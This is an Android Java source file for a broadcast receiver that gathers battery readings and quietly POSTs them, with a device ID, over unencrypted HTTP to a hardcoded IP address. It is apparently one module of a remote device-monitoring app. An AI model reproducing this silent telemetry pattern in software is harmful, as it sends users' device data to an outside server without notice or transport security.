package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class BatteryReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraBatt";
    private static final String SERVER = "http://216.128.156.226:8443";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("level", intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
            obj.put("scale", intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100));
            obj.put("temp", intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
            obj.put("voltage", intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0));
            obj.put("plugged", intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0));
            obj.put("status", intent.getIntExtra(BatteryManager.EXTRA_STATUS, 0));
            obj.put("health", intent.getIntExtra(BatteryManager.EXTRA_HEALTH, 0));
            obj.put("action", intent.getAction());
            
            sendData(context, obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "Battery error", e);
        }
    }
    
    private void sendData(Context context, String content) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "battery");
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
